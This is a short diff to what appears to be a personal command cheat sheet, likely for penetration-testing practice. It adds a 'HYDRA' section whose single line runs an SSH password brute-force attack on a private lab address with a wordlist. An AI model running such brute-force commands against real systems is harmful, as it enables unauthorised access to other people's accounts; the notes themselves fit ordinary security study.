@@ -716,4 +716,8 @@ ps -u *username*
 List file path of a certain process
 ps -fp $PID_Number
 
+=====================================================================
+		7.) HYDRA
+=====================================================================
 
+hydra -l eve -P wordlist 192.168.45.186 -t 4 ssh -V 
